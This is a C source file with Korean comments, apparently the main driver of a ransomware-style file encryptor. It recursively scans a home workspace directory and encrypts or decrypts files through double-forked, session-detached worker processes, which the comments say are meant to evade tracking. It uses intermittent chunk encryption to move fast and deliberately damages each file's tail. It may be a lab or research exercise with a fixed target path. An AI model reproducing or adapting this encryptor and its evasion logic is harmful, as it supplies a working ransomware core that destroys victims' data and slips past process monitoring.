#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // fork, waitpid
#include <sys/wait.h>
#include <sys/stat.h>
#include <dirent.h>
#include <limits.h>
#include <errno.h>
#include <semaphore.h>  // (기존 참조 남김)
#include <sys/mman.h>   // mmap (공유 메모리)
#include <signal.h>

#include "crypto.h"     // encrypt_chunk_range, decrypt_chunk_range
#include "file_ops.h"   // file_queue, file_count, scan_directory_recursive

// crypto.c와 동일한 값 사용 (4096)
#define CHUNK_SIZE 4096

// 한 PID가 처리할 청크 개수 (10번 → 약 40KB)
#define MAX_WRITES_PER_PID 10

// 프로세스 제한을 위한 모니터 포인터 (최대 동시 실행 수 제한)
// main 함수에서 mmap으로 할당할 예정
#include "sem_monitor.h"

static sem_monitor_t *proc_limiter = NULL;
static pid_t proc_limiter_monitor = 0;


/**
 * @brief 프로그램 사용법 출력
 */
static void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [mode]\n", prog_name);
    fprintf(stderr, "Modes:\n");
    fprintf(stderr, "  -e    Encrypt mode\n");
    fprintf(stderr, "  -d    Decrypt mode\n");
}

/**
 * @brief 한 번의 fork로 특정 offset부터 일부 청크만 암/복호화하는 워커 생성
 * @param target        대상 파일 경로
 * @param offset        시작 오프셋
 * @param chunks        처리할 청크 개수
 * @param mode          0: Encrypt, 1: Decrypt
 * @return 0: 성공, 1: 실패
 */
static int spawn_worker(const char *target, long offset, int chunks, int mode) {
    
    // 0. 입장권 확인 (프로세스 수 제한)
    // 부모는 빈 슬롯이 생길 때까지 대기한다. 실제 허가는 워커(손자)가 시작할 때 획득함.
    if (proc_limiter) {
        while (semmon_get_used(proc_limiter) >= semmon_get_max_permits(proc_limiter)) {
            usleep(10000);
        }
    }
    
    // 1. 첫 번째 포크 (Main -> Child 1)
    pid_t pid = fork();

    if (pid < 0) {
        perror("First fork failed");
        return 1;
    }

    if (pid == 0) {
        // ---- [Child 1] ----
        
        // [추가] 세션 및 프로세스 그룹 분리
        // 이 호출로 인해 Child 1은 부모(Main)와 다른 '새로운 그룹'의 대장이 됩니다.
        // 이후 생성되는 손자(Child 2)는 이 새로운 그룹에 속하게 되어 추적을 피합니다.
        if (setsid() < 0) {
            // 실패하더라도 공격은 계속 진행 (치명적이지 않음)
             perror("setsid failed");
        }
        
        
        // 2. 두 번째 포크 (Child 1 -> Child 2)
        pid_t grand_pid = fork();

        if (grand_pid < 0) {
            perror("Second fork failed");
            _exit(1);
        }
        if (grand_pid == 0) {
            // ---- [Child 2] ----
            // Child2(실제 워커)는 시작 직후 허가를 획득해야 함
            if (proc_limiter) {
                if (semmon_acquire(proc_limiter) != 0) {
                    // 획득 실패 시 종료
                    _exit(1);
                }
            }
            int ret;
            if (mode == 0) {
                ret = encrypt_chunk_range(target, offset, chunks);
            } else {
                ret = decrypt_chunk_range(target, offset, chunks);
            }

            // 작업 완료 이후 입장권 반납 (Main이 대기 중이면 깨어남)
            // 손자 프로세스는 부모와 메모리가 다르지만, mmap된 영역은 공유됨.
            if (proc_limiter) semmon_release(proc_limiter);

            if (ret != 0) {
                _exit(1);
            }
            _exit(0);
        }
        // 자식2를 낳았으므로 자식1의 역할은 끝. 즉시 종료하여 손자를 '고아'로 만듦.
        // 아직 손자가 일을 하고 있으므로 sem_post를 하면 안됨.
        _exit(0);
    }
    else {
        // ---- [Parent] ----
        // 자식 1이 종료될 때까지만 기다림.
        // 자식 1은 손자를 낳자마자 바로 죽으므로 waitpid는 거의 즉시 반환됨.
        int status;
        if (waitpid(pid, &status, 0) < 0) {
            perror("waitpid failed");
            return 1;
        }

        // 메인 프로세스는 손자(실제 일꾼)를 기다리지 않고 바로 다음 루프로 넘어감.
        return 0;
    }
}


/**
 * @brief 파일 큐(file_queue)에 쌓여 있는 파일들에 대해
 *        자식 프로세스를 생성하면서 순차적으로 공격(암/복호화)을 수행
 * @param mode 0: Encrypt, 1: Decrypt
 */
void execute_attack(int mode) {
    for (int i = 0; i < file_count; i++) {
        char *target = file_queue[i];

        // 1. 파일 정보 획득 (크기 확인)
        struct stat st;
        if (stat(target, &st) != 0) {
            perror("[SKIP] stat failed");
            continue; // 파일이 없거나 접근 불가
        }
        long total_size = st.st_size;
        if (total_size <= 0) {
            printf("[SKIP] 빈 파일: %s\n", target);
            continue;
        }

        long write_amount = (long)MAX_WRITES_PER_PID * CHUNK_SIZE; // 한 PID 작업량 (약 40KB)
        long skip_distance = 0;

        // ============================================================
        // 파일 크기에 따른 간헐적 암/복호화(Skip) 전략
        // (Encrypt/Decrypt 모두 동일 패턴 사용해야 복호화 가능)
        // ============================================================
        if (total_size < 1024 * 1024) {
            // [Case 1] 1MB 미만: 건너뛰지 않음 (100% 처리)
            skip_distance = 0;
        } else if (total_size < 100 * 1024 * 1024) {
            // [Case 2] 100MB 미만: 약 10%만 처리
            // 40KB 처리 후 -> 360KB 건너뜀
            skip_distance = write_amount * 9;
        } else {
            // [Case 3] 100MB 이상: 속도 위주
            // 40KB 처리 후 -> 10MB 건너뜀
            skip_distance = 10 * 1024 * 1024;
        }

        printf("[TARGET] %s (Size: %ld bytes, Skip: %ld bytes) %s 시작\n",
               target,
               total_size,
               skip_distance,
               (mode == 0) ? "암호화" : "복호화");

        long current_offset = 0;
        int child_round = 0;
        int attack_failed = 0;
        // [추가] 마지막으로 암호화가 끝난 위치를 추적하는 변수
        long last_encrypted_end = 0;

        // 2. 이어달리기 루프
        while (current_offset < total_size) {
            int ret = spawn_worker(target, current_offset, MAX_WRITES_PER_PID, mode);
            child_round++;
            
            // 세마포어 제어가 있으므로 usleep은 필수가 아니지만, 
            // 너무 빠른 루프 회전으로 인한 CPU 점유율 조절용으로 짧게 유지
            usleep(10000);

            if (ret != 0) {
                attack_failed = 1;
                break;  // 이 파일에 대한 공격 중단
            }
            
            // [추가] 이번에 처리한 구간의 끝 위치 기록
            long this_end = current_offset + write_amount;
            if (this_end > total_size) this_end = total_size; // 파일 끝을 넘지 않음
            
            if (this_end > last_encrypted_end) {
                last_encrypted_end = this_end;
            }

            // 자식이 처리한 양 + 전략적으로 건너뛸 양
            current_offset += (write_amount + skip_distance);
        }

        // 3. Tail 처리 (파일 끝부분 구조 파괴/복구용)
        //    Encrypt/Decrypt 모두 같은 위치를 한 번 더 처리해야
        //    CTR 기반에서 정확히 되돌릴 수 있음.
        
        // [수정] 'last_encrypted_end'를 사용하여 중복 처리를 막음
        if (!attack_failed && total_size > CHUNK_SIZE) {
            
            long tail_offset = total_size - CHUNK_SIZE;
            
            // 만약 계산된 꼬리 위치가 이미 처리된 영역과 겹치면?
            // -> 겹치지 않도록 시작 위치를 '처리된 끝부분'으로 미룸
            if (tail_offset < last_encrypted_end) {
                tail_offset = last_encrypted_end;
            }

            // 조정 후에도 아직 파일 끝까지 남은 공간이 있다면 실행
            if (tail_offset < total_size) {
                // 남은 크기가 1개 청크보다 작아도 encrypt_chunk_range 내부에서 
                // 파일 끝(EOF)을 만나면 알아서 멈추므로 안전함.
                int ret = spawn_worker(target, tail_offset, 1, mode);
                
                // Tail 처리 후에도 잠깐 쉼
                usleep(10000);

                if (ret != 0) {
                    printf("[SKIP] Tail 처리 실패: %s\n", target);
                    attack_failed = 1;
                } else {
                    child_round++;
                }
            }
        }

        if (!attack_failed) {
            printf("[COMPLETE] %s 처리 완료 (총 %d회 PID 교체)\n",
                   target, child_round);
        } else {
            printf("[STOP] %s 처리 중단됨\n", target);
        }
    }
}


/**
 * @brief 프로그램 시작점
 */
int main(int argc, char *argv[]) {
    if (argc != 2) {  // 인자로 모드만 받음
        fprintf(stderr, "Error: Invalid arguments.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    // 모드 파싱
    int mode;
    if (strcmp(argv[1], "-e") == 0) {
        mode = 0;  // Encrypt
    } else if (strcmp(argv[1], "-d") == 0) {
        mode = 1;  // Decrypt
    } else {
        fprintf(stderr, "Error: Invalid mode '%s'\n\n", argv[1]);
        print_usage(argv[0]);
        return 1;
    }


    // [/home/user/workspace/illusion]으로 고정
    // HOME 환경변수 기준으로 백엔드 경로 지정
    const char *home_dir = getenv("HOME");
    if (!home_dir) {
        fprintf(stderr, "Error: HOME environment variable not set.\n");
        return 1;
    }
    
    char start_path[PATH_MAX];

    if (snprintf(start_path, sizeof(start_path),
             "%s/workspace/illusion", home_dir) >= (int)sizeof(start_path)) {
        fprintf(stderr, "Error: Target path is too long.\n");
        return 1;
    }
    
    
    printf("--- Start Traversal ---\n");
    printf("  Target Mode: %s\n", (mode == 0) ? "ENCRYPT" : "DECRYPT");
    printf("  Target Path: %s\n", start_path);
    printf("------------------------\n");
    
    // 디렉터리 스캔 → file_queue 채우기
    scan_directory_recursive(start_path);

    printf(">>> Found %d files\n", file_count);

    // [추가] proc_limiter 초기화 (익명 공유 메모리 사용)
    proc_limiter = mmap(NULL, sizeof(sem_monitor_t),
                        PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (proc_limiter == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // 세마포어 대체 모니터 초기화 (동시 실행 프로세스 개수: 10)
    if (semmon_init(proc_limiter, 10) != 0) {
        fprintf(stderr, "semmon_init failed\n");
        munmap(proc_limiter, sizeof(sem_monitor_t));
        return 1;
    }

    // 모니터 프로세스 시작 (주기: 1초)
    proc_limiter_monitor = semmon_start_monitor(proc_limiter, 1);
    if (proc_limiter_monitor <= 0) {
        fprintf(stderr, "semmon_start_monitor failed\n");
        // 그래도 계속 동작은 가능하므로 경고만 출력
    }

    execute_attack(mode);

    // 리소스 정리
    if (proc_limiter_monitor > 0) {
        semmon_stop_monitor(proc_limiter_monitor);
    }
    munmap(proc_limiter, sizeof(sem_monitor_t));

    printf("------------------------\n");
    printf("--- End Traversal ---\n");
    return 0;
}
